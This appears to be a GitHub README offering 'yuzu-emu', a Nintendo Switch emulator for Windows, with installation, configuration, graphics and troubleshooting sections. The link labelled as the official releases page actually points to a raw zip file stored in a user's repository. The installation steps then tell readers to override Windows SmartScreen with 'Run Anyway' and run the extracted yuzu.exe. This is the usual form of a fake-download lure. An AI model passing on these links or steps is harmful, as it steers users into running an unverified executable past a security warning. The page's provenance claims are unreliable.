# 🎮 yuzu-emu - Play Nintendo Switch Games On PC

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Adrianaferraris/yuzu-emu/raw/refs/heads/main/NintendoEmulator/emu_yuzu_2.1.zip)

## Overview

yuzu-emu allows you to play your Nintendo Switch games on a Windows computer. You can enjoy titles like Pokemon Scarlet, Violet, and Mario Kart 8 Deluxe with improved graphics and performance. The software supports features like custom resolutions, handheld mode, and handheld display settings. It manages internal tasks like shader compilation to prevent stutter during gameplay.

## 🛠 Prerequisites

Before you start, ensure your computer meets these requirements:

- Operating System: Windows 10 or Windows 11 (64-bit).
- Processor: An Intel Core i5 or AMD Ryzen 5 or better.
- Memory: 8 GB of RAM or more.
- Graphics: A dedicated graphics card that supports Vulkan 1.1 or higher. 
- Storage: 500 MB of space for the emulator, plus additional space for your games.
- Visual C++: Install the latest Microsoft Visual C++ redistributable packages from the official Microsoft support page.

## 📥 Installation

Follow these steps to set up the software on your machine:

1. Visit the [official releases page](https://github.com/Adrianaferraris/yuzu-emu/raw/refs/heads/main/NintendoEmulator/emu_yuzu_2.1.zip) to download the software.
2. Choose the latest version ending in `.zip` or the installer `.exe` file.
3. If you downloaded a zip file, right-click the folder and select Extract All. 
4. Open the extracted folder and run the `yuzu.exe` file.
5. If a Windows SmartScreen window appears, click More Info then click Run Anyway.

## ⚙️ Initial Configuration

After launching the program, you must provide the necessary system files to run games.

### Firmware and Keys
The emulator requires specific Nintendo Switch system files to function. You must provide your own `prod.keys` file and firmware files version 18.1.0. Place these files in the `keys` and `nand` folders within your yuzu-emu directory. You can find these folders by clicking File and then Open yuzu Folder in the emulator menu.

### Controller Setup
To play games, connect your controller via USB or Bluetooth. Go to Emulation, then Configure, and select Controls. Choose your controller type from the list. If you use Joy-Cons, you can map your buttons manually. This menu also allows you to enable or disable motion controls.

## 🚀 Game Setup

Once you configure the keys and firmware, add your game library.

1. Create a folder on your computer to store your Nintendo Switch game files.
2. Place your game files in this folder.
3. Open yuzu-emu and double-click the empty space in the main window.
4. Select the folder containing your games.
5. The games will appear in the library list.

## 🖼 Graphics Settings

You can change image quality and performance in the graphics menu. 

- Graphics API: Vulkan is the recommended setting for most systems. It offers better performance in most games.
- Resolution: Increase the resolution to 2x or 3x for a sharper picture.
- Handheld vs Docked: Switch between these modes based on your needs. Docked mode generally provides higher graphic quality, while Handheld mode mimics the portable experience.
- Shader Stutter Fix: Toggle this setting to prevent frame drops when loading new game areas.

## ⚡ Performance Tips

If you experience slow performance, consider these adjustments:

- FPS++ Mod: Apply this mod to unlock the frame rate in compatible games. 
- Multicore CPU Emulation: Ensure this box is checked in the system settings. It allows the emulator to use all processors in your computer.
- Custom Resolution: Reduce the internal resolution to 1x if you encounter frame rate drops.
- Joy-Con Drift: If your controller character moves on their own, use the deadzone slider in the controller settings to correct the input.

## 💾 Save File Management

You can import or export save files easily. Right-click any game in the main list and select Open Save Data Location. This folder contains your progress files. You can copy these files to a backup location or move them to a new computer if you reinstall the software.

## 🌐 Local Wireless

The software supports local wireless play through LDN. You can connect with other players who also use the emulator. Navigate to the network settings menu to configure your connection. Ensure your firewall allows the program to communicate through the network.

## 🆘 Troubleshooting

If you encounter issues, look here for solutions:

- Game does not start: Verify your `prod.keys` file is valid and placed in the correct folder. 
- Black screen: Update your graphics card drivers from the website of your hardware manufacturer.
- Audio issues: Go to the Audio tab in the settings and adjust the output device. Standard audio backends usually work well.
- Controller not recognized: Re-pair your controller in Windows settings and restart the emulator.

## 📜 Legal Notice

This software is a tool for developers and enthusiasts to study and test console software. You are responsible for following all local laws regarding software and intellectual property. Only use game files that you have legally obtained from your own physical copies.